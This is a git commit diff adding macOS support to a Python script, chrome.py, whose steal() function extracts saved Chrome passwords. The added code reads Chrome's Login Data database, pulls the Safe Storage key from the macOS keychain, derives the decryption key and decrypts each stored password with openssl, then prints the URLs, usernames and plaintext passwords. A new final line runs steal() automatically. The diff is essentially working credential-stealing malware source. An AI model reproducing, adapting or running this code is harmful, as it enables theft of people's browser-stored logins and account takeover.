028734354096fcb24de098a3900765165925298a
Gavin Henderson <gavin.henderson@hotmail.co.uk>
2017-12-16 18:33:29 +0000

    OSx Support added for chrome

--- chrome.py
+++ chrome.py
@@ -1,35 +1,104 @@
 import platform
+#windows imports
 if platform.system() == "Windows":
 	import os
 	import sqlite3
 	import win32crypt
 	import sys
+#osx imports
+elif platform.system() == 'Darwin':
+	import sqlite3
+	from os import path
+	import binascii
+	import subprocess
+	import base64
+	from hashlib import pbkdf2_hmac
+
+def queryDB(DBpath):
+	# Try to open the SQLite3 database
+	try:
+		conn = sqlite3.connect(DBpath)
+		cursor = conn.cursor()
+	except:
+		print "[-] Couldn't open the database"
+		return
+
+	#Pull encryped passwords from database.
+	try:
+		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
+	except:
+		print '[-] Error getting the passwords'
+		return
+	# Fetch all data
+	return cursor.fetchall()
+
 def steal():
 	# Do only if on Windows, Linux and Mac support will be added later
 	if platform.system() == "Windows":
 		steal_windows()
+	elif platform.system()=='Darwin':
+		steal_osx()
 	else:
-		print("[-] Only Windows is supported")
+		print("[-] "+platform.system()+"is not a supported OS")
+
+def steal_osx():
+	#get the passwords
+	data = queryDB(path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
+
+	#get encrpytion key from keychain
+	safe_storage_key = subprocess.Popen(
+		"security find-generic-password -wa "
+		"'Chrome'",
+		stdout=subprocess.PIPE,
+		stderr=subprocess.PIPE,
+		shell=True)
+	stdout, stderr = safe_storage_key.communicate()
+	safe_storage_key = stdout.replace("\n", "")
+
+
+	#catch keychain errors
+	if stderr:
+		print("Error: Chrome entry not found in keychain?".format(stderr))
+		return
+	if not stdout:
+		print("User clicked deny.")
+
+	#Loop through the passwords
+	if len(data) > 0:
+		for result in data:
+	  		#Setup initialisation vector
+	  		iv = ''.join(('20', ) * 16)
+
+			#setup decryption key
+			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
+			hex_key = binascii.hexlify(key)
+
+			#decrpyt password with key
+			hex_enc_password = base64.b64encode(result[2][3:])
+
+		    # send any error messages to /dev/null to prevent screen bloating up
+		    # (any decryption errors will give a non-zero exit, causing exception)
+			try:
+				if hex_enc_password:
+					#decrpyt with openssl
+					password = subprocess.check_output(
+						"openssl enc -base64 -d "
+						"-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
+						hex_enc_password+" 2>/dev/null",
+						shell=True)
+					print "[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
+			except subprocess.CalledProcessError:
+				password = "Error decrypting this data"
+		return
+	else:
+		print '[-] There are no passwords'
+		return
+
 
 def steal_windows():
 	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
-	path = os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data'
-	try:
-	# Try to open the SQLite3 database
-		conn = sqlite3.connect(path)
-		cursor = conn.cursor()
-	# Whoah an error, happens when the database is locked (Chrome is still open)
-	except:
-		print('[-] Couldn\'t open the database')
-		return
-	# Execute the query
-	try:
-		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
-	except:
-		print('[-] Error getting the passwords')
-		return
-	# Fetch all data
-	data = cursor.fetchall()
+	data = queryDB(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
+
 	# Check if there is any data
 	if len(data) > 0:
 		for result in data:
@@ -51,3 +120,5 @@ def steal_windows():
 	else:
 		print('[-] There are no passwords')
 		return
+
+steal()
